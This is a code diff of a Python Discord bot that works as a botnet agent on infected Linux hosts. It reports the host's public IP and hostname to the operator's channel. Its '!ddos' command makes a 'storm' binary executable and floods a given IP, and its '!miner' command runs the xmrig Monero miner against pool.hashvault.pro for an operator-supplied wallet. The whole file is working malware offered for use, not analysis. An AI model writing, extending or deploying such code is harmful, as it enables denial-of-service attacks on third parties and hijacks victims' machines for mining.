@@ -1,16 +1,8 @@
 from discord.ext import commands
-from discord import app_commands
-from urllib import request
-import multiprocessing
-import requests
-import discord
-import psutil
-import socket
-import sys
-import os
+import requests, discord, psutil, socket, sys, os
 
-token = '' # Token
-channel_id =  # Channel ID
+token = 'MToken.mnt.discord' # Token
+channel_id = 111111111111111111  # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -19,10 +11,8 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 bot.remove_command('help')
 
 # client
-ip = requests.get('https://api.ipify.org').text.strip()
+ip = requests.get('https://sheesh.rip/ip').headers['IP']
 hostname = socket.gethostname()
-total_cpu = multiprocessing.cpu_count()
-hcpu = int(total_cpu / 2)
 os.chdir("/tmp")
 
 # login
@@ -69,10 +59,10 @@ async def check(ctx):
 
 # ddos
 @bot.command()
-async def ddos(ctx, arg1):
-    ddosip = ''.join(arg1)
-    os.popen(f"./storm -d {ddosip}")
-    await ctx.send(f"``[+] {ip}@{hostname}: DDoS started``")
+async def ddos(ctx, ddosarg):
+    ddosip = ''.join(ddosarg)
+    os.popen(f"chmod +x storm & ./storm -d {ddosip}")
+    await ctx.send(f"``[+] {ip}@{hostname}: DDoS started to {ddosip}``")
 
 # stop ddos
 @bot.command()
@@ -83,8 +73,8 @@ async def stopddos(ctx):
 
 # miner
 @bot.command()
-async def miner(ctx, arg1):
-    wallet = ''.join(arg1)
+async def miner(ctx, walletArg):
+    wallet = ''.join(walletArg)
     os.popen(f"./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
     await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")
 
